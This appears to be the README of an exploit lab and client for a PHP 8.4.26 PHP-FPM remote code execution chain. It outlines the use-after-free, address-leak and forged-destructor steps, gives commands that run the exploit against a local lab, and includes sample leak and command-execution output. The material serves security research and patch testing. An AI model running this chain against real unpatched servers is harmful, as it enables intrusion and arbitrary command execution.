# php2shell-nginx-fpm-full-rce

A self-contained nginx + PHP-FPM exploit laboratory and client for the
cross-request `BG(unserialize)` stale-state chain in **PHP 8.4.26** (fixed in
**8.4.27**).

This repository is the FPM-only extraction of
[`devploit/php2shell`](https://github.com/devploit/php2shell). It contains the
client, the user-prefix nginx/FPM laboratory, the 8.4.26 profile, and the
tests. There is no Apache code and no Docker dependency.

> **Authorized testing only.** Use this only on systems you own or have
> explicit written permission to test. The chain sends large bodies, triggers
> OOM conditions, and kills PHP-FPM workers. Run it against disposable local
> laboratories. See [LICENSE](LICENSE).

## What it does

The target requires an application operation that starts a session and
reflects session values. The included `lab/fpm/webroot/app.php` is that
operation.

1. **Arm.** A post-RINIT OOM in a session decode is caught by
   `php_execute_script`; the worker survives and `BG(unserialize)` keeps
   `{level=1, data=d}` pointing at the freed 8216-byte struct.
2. **Locate/reclaim.** The next request is a multipart POST. Its rfc1867
   handler starts the session *before* RINIT and reuses the stale `d`. A
   controlled 16 KB buffer reclaims the slot and forges the var_hash state.
3. **Leak (optional).** `leak`/`no-oracle` recover the Zend-MM chunk and
   php-fpm PIE bases from a stale short-session string OOB read over HTTP.
   This removes the runtime `/proc/<pid>/mem` dependency.
4. **Forge and fire.** `R:2` resolves to a forged `IS_REFERENCE` whose value
   is a fake `HashTable` with `pDestructor = zif_system`. The session shutdown
   path calls it, executes the command, and aborts the worker. FPM respawns
   the worker; a `502` after the fire is expected.

## Requirements

- Linux **amd64** (the verified profile is Debian 8.4.26 amd64).
- Python 3.11+.
- `gcc`, `make`, `curl`, `tar` for the user-prefix builds.
- No root and no Docker.

The default `endgame` calibration reads `/proc/<pid>/mem` and therefore needs
`kernel.yama.ptrace_scope=0`. `no-oracle` does **not** read process memory.

## Build the laboratory

```sh
# nginx into lab/fpm/runtime/nginx
lab/fpm/build_nginx.sh

# PHP 8.4.26 into lab/fpm/runtime/php-8.4.26
lab/fpm/build_php.sh 8.4.26

# optional: the fixed build for patchcheck
lab/fpm/build_php.sh 8.4.27
```

The scripts download the source tarballs if needed and install into
`lab/fpm/runtime/` (ignored by git). No system files are modified.

Start the lab:

```sh
python3 tools/php2shell_fpm_labs.py up --only 8.4.26
python3 tools/php2shell_fpm_labs.py status
```

Ports:

| Build | chain HTTP | builder HTTP | chain FPM | builder FPM |
| --- | --- | --- | --- | --- |
| 8.4.26 | :8110 | :8111 | :9001 | :9002 |
| 8.4.27 | :8120 | :8121 | :9011 | :9012 |

The **chain** pool is the 8 MB consumer; the **builder** pool is the 64 MB,
`cleanup=Off` session builder. Both are required.

Stop the lab with:

```sh
python3 tools/php2shell_fpm_labs.py down
```

## Run the exploit

### HTTP-only bases (recommended)

```sh
# print the leaked bases
python3 tools/php2shell_fpm.py \
  --base http://127.0.0.1:8110 \
  --builder http://127.0.0.1:8111 \
  --version 8.4.26 leak

# full RCE proof without /proc/<pid>/mem
python3 tools/php2shell_fpm.py \
  --base http://127.0.0.1:8110 \
  --builder http://127.0.0.1:8111 \
  --version 8.4.26 \
  --command 'id>out/p1' --proof-file out/p1 \
  no-oracle
```

Example output:

```text
[*] HTTP leak attempt 1: chunk=0x7f4f48800000 pie=0x55d75fc00000
[+] chunk=0x7f4f48800000 pie=0x55d75fc00000
[*] bases from HTTP stale-string leak: pie=0x55d75fc00000 chunk=0x7f4f48800000
[*] no-oracle: chunk=0x7f4f48800000 pie=0x55d75fc00000 zif=0x55d75ff86660
[*] consumer status=502
[*] attempt 0: d=0x7f4f48881000 k=0xfe8 status=502
[+] RCE proof via /out/p1: b'uid=1000(...) ...'
```

Fetch the proof separately:

```sh
curl http://127.0.0.1:8110/out/p1
```

### Oracle calibration mode (local lab)

```sh
python3 tools/php2shell_fpm.py \
  --base http://127.0.0.1:8110 \
  --builder http://127.0.0.1:8111 \
  --version 8.4.26 \
  --command 'id>out/p1' --proof-file out/p1 \
  endgame
```

`leak` and `no-oracle` accept `--chunk`/`--pie` overrides; local
`/proc/<pid>/maps` is a fallback when the HTTP leak is unavailable. The bases
are stable for the lifetime of the FPM master.

### Patch check

With both builds running:

```sh
python3 tools/php2shell_fpm.py patchcheck
# 8.4.26: STALE-ARMED
# 8.4.27: clean
```

## Tests

```sh
python3 -m unittest discover -s tests -v
```

The unit tests need no lab. The live tests are opt-in:

```sh
PHP2SHELL_FPM_LAB=1 python3 -m unittest \
  tests.test_fpm.FpmLabIntegrationTests -v
```

The live suite covers `primitive`, `endgame`, and `no-oracle` against
`127.0.0.1:8110/8111`.

## Layout

```text
tools/php2shell_fpm.py       exploit client and leak/no-oracle paths
tools/php2shell_fpm_labs.py  user-prefix nginx + FPM launcher
profiles/8.4.26-fpm.json     verified offsets and heap geometry
profiles/schema.json         profile schema
lab/fpm/                     build scripts, configs, app/webroot
tests/test_fpm.py            unit and live tests
```

## Limitations

- Verified only for PHP **8.4.26 amd64**; another build needs its own profile.
- The target must expose an application operation that starts a session and
  reflects session data. The included `app.php` is that stand-in.
- The consumer and builder must be separate pools (8 MB vs 64 MB).
- The command in the forged string is limited to **87 bytes**, with no NUL.
- The worker can die after the command; a `502` is normal, and the proof file
  is the reliable result.
- The oracle mode is local-lab only; `no-oracle` still needs the builder and
  session endpoints.

## Credits

Original research, Apache chain, and FPM chain: the
[`php2shell`](https://github.com/devploit/php2shell) project. This extraction
keeps the FPM-only client and laboratory. Licensed under MIT; see
[LICENSE](LICENSE).
